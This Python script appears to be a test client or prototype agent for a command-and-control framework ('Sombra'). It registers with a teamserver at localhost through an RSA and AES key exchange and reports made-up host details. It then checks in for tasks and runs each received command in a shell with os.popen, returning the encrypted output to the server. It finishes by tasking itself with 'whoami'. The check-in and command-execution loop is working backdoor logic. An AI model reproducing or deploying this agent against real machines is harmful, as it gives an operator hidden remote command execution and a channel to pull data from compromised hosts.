import base64
import os
import struct

import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

TEAMSERVER = "127.0.0.1"
INT = 50050

UID = ""
KEY = get_random_bytes(32)
nonce = get_random_bytes(16)
SESSION_KEY = nonce + b"\x00" * 4 + KEY

TypeGenericSombraPackage = 0x0
TypeSombraGetTask = 0x1
TypeSombraHello = 0x2
TypeSombraKeyExchange = 0x3
TypeSombraGenSession = 0x4
TypeSombraInitAgent = 0x5
TypeGenericCheckin = 0x6
TypeGenericTaskRequest = 0x7
TypeGenericTaskResponse = 0x8


def unpad(data):
    padding_length = data[-1]  # Last byte indicates how many bytes to remove
    unpadded_data = data[:-padding_length]
    unpadded_data = unpadded_data[6:]
    return unpadded_data

def pad(data: bytes, block_size: int) -> bytes:
    padding_length = block_size - (len(data) % block_size)
    padding = bytes([padding_length] * padding_length)  # Padding bytes
    return data + padding


def encode_ltv_message(msg_type: int, value: str) -> bytes:
    if not (0 <= msg_type <= 0xFFFF):
        raise ValueError("msg_type must be a 16-bit unsigned integer")

    msg = b""
    msg += struct.pack(">I", len(value))  # L
    msg += struct.pack(">H", msg_type)  # T
    msg += value.encode("utf-8")  # V

    return msg


def decode_ltv_message(msg: bytes) -> (int, bytes):
    if len(msg) < 6:
        raise ValueError("Message is too short")

    length = struct.unpack(">I", msg[:4])[0]
    msg_type = struct.unpack(">H", msg[4:6])[0]
    value = msg[6:6 + length]

    return msg_type, value


def start_listener():
    data = {
        "type": "http",
        "port": "80"
    }
    r = requests.post(f"http://{TEAMSERVER}:{INT}/start_listener", json=data)
    print(r.text)


def RSA_encrypt(data: bytes, key: int) -> bytes:
    return pow(int.from_bytes(data, byteorder='big'), 65537, key).to_bytes(256, byteorder='big')


def register():
    ltv_message = encode_ltv_message(TypeSombraHello, "")
    r = requests.post(
        f"http://{TEAMSERVER}:80/register",
        data=ltv_message,
        headers={"Content-Type": "application/octet-stream"}
    )
    a, b = decode_ltv_message(r.content)
    print(f"[{TypeSombraHello}] {a} {b}")

    ltv_message = encode_ltv_message(TypeSombraKeyExchange, "")
    r = requests.post(
        f"http://{TEAMSERVER}:80/register",
        data=ltv_message,
        headers={"Content-Type": "application/octet-stream"}
    )

    a, b = decode_ltv_message(r.content)
    key = int.from_bytes(b, byteorder='big')
    print(f"[{TypeSombraKeyExchange}] {a} {str(key)[:10]}")

    E = 65537  # fixed
    N = key
    public_key_json = {"E": E, "N": N}
    public_key_components = RSAPublicNumbers(public_key_json["E"], public_key_json["N"]).public_key(default_backend())
    rsa_pk = public_key_components.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    public_key = serialization.load_pem_public_key(rsa_pk, default_backend())
    encrypted = public_key.encrypt(
        SESSION_KEY,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    b64_encrypted = base64.b64encode(encrypted).decode()
    ltv_message = encode_ltv_message(TypeSombraGenSession, b64_encrypted)
    r = requests.post(
        f"http://{TEAMSERVER}:80/register",
        data=ltv_message,
        headers={"Content-Type": "application/octet-stream"}
    )

    a, b = decode_ltv_message(r.content)
    print(f"[{TypeSombraGenSession}] {a} {b}")
    print(f"assigned UID: {b.decode()}")

    global UID

    IP = "192.168.1.1"
    ExtIP = "192.168.1.1"
    Hostname = "test"
    Sleep = "60"
    Jitter = "10"
    OS = "Windows"
    UID = b.decode()
    PID = "1234"

    agent_data = f"{IP}||{ExtIP}||{Hostname}||{Sleep}||{Jitter}||{OS}||{UID}||{PID}"
    cipher = AES.new(KEY, AES.MODE_CBC, nonce)
    encrypted_data = cipher.encrypt(pad(agent_data.encode(), AES.block_size))
    b64_cipher = base64.b64encode(encrypted_data).decode()
    # ltv message = UID || {encrypted_blob}, server expects this
    message = f"{UID}||{b64_cipher}"
    ltv_message = encode_ltv_message(TypeSombraInitAgent, message)
    r = requests.post(
        f"http://{TEAMSERVER}:80/register",
        data=ltv_message,
        headers={"Content-Type": "application/octet-stream"}
    )

    print(r.text)


def checkin():
    data = encode_ltv_message(TypeGenericCheckin, UID)
    r = requests.post(
        f"http://{TEAMSERVER}:80/checkin",
        data=data,
        headers={"Content-Type": "application/octet-stream"}
    )
    a, b = decode_ltv_message(r.content)
    if (b == b"no tasks"):
        return

    enc_task = b
    cipher = AES.new(KEY, AES.MODE_CBC, nonce)
    decrypted = cipher.decrypt(enc_task)
    task = unpad(decrypted).decode().strip()
    print(task)

    # task = [cmd_id]||[cmd
    task = task.split("||")
    cmd_id = task[0]
    cmd = task[1]

    print(f"cmd_id: {cmd_id}")
    print(f"cmd: {cmd}")

    stdout = os.popen(cmd).read()
    stdout = stdout.encode()
    cipher = AES.new(KEY, AES.MODE_CBC, nonce)
    # result = [cmd_id]||[res]
    result = f"{cmd_id}||{stdout.decode()}"

    encrypted = cipher.encrypt(pad(result.encode(), AES.block_size))
    b64_encrypted = base64.b64encode(encrypted).decode()

    data = encode_ltv_message(TypeGenericTaskResponse, b64_encrypted)
    # sent_data = [UID]||[encrypted_blob]
    sent_data = f"{UID}||{data.decode()}"
    data = encode_ltv_message(TypeGenericSombraPackage, sent_data)
    print(f"encrypted data: {data}")
    print(f"decrypted: {decrypted}")
    r = requests.post(
        f"http://{TEAMSERVER}:80/checkout",
        data=data,
        headers={"Content-Type": "application/octet-stream"}
    )
    print(r.text)


def assign_task():
    task = {
        "Agent": {
            "UID": UID,
        },
        "Task": {
            "UID": UID,
            "CommandID": "asdasdas",
            "Command": "whoami"
        }
    }

    r = requests.post(f"http://{TEAMSERVER}:50050/task", json=task)
    print(r.text)


start_listener()
register()
checkin()

print(f"given uid: {UID}")
checkin()
assign_task()
checkin()
